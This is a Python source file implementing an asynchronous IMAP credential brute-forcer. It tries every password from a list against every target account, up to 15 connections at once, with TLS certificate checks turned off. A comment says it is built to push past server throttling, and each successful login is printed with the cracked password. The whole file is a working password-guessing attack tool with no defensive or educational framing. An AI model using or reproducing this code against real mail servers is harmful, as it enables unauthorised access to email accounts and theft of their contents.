import asyncio
import ssl
import time

async def test_credential_async(target, password, semaphore, timeout=8):
    server = target["server"]
    port = target["port"]
    user = target["user"]

    async with semaphore:
        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        start_time = time.time()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(server, port, ssl=ssl_context),
                timeout=timeout
            )

            # Read initial server greeting banner
            await asyncio.wait_for(reader.readline(), timeout=5)
            
            # Format standard IMAP login command
            login_tag = b"A001"
            login_cmd = f'{login_tag.decode()} LOGIN "{user}" "{password}"\r\n'.encode()
            
            writer.write(login_cmd)
            await writer.drain()

            response = await asyncio.wait_for(reader.readline(), timeout=5)
            
            writer.close()
            await writer.wait_closed()

            elapsed = time.time() - start_time

            if b"OK" in response:
                print(f"\n[+] MATCH IDENTIFIED [Elapsed: {elapsed:.2f}s]")
                print(f"    Host: {server}:{port} | User: {user} | Key: {password}")
                return {"status": "SUCCESS", "target": server, "user": user, "password": password}
            elif b"NO" in response or b"BAD" in response:
                return None
            else:
                return None

        except asyncio.TimeoutError:
            # Implement adaptive backoff if server tarpits or throttles
            await asyncio.sleep(1.5)
            return None
        except Exception:
            return None

async def run_engine(targets, passwords, concurrency_limit=15):
    semaphore = asyncio.Semaphore(concurrency_limit)
    tasks = []

    for target in targets:
        for pwd in passwords:
            tasks.append(test_credential_async(target, pwd, semaphore))

    start_global = time.time()
    results = await asyncio.gather(*tasks)
    duration = time.time() - start_global

    valid_hits = [r for r in results if r is not None]
    return valid_hits, duration
